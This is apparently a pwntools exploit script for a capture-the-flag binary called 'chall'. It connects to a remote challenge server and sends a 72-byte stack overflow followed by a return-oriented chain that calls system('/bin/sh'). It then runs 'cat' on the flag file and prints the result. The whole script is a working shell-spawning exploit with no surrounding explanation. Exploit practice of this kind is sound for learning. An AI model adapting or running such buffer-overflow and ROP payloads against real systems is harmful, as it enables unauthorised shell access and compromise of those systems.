from pwn import *

context.binary = elf = ELF("./chall", checksec=False)

io = remote("35.192.106.100",20001)

offset = 72

payload = flat(
    b"A"*offset,

    0x40101a,       # ret alignment

    0x401204,       # pop rdi
    0x402084,       # "/bin/sh"

    0x401080        # system
)

io.sendline(payload)

io.sendline(b"cat /home/ctf/flag.txt")

print(io.recvall(timeout=3).decode())
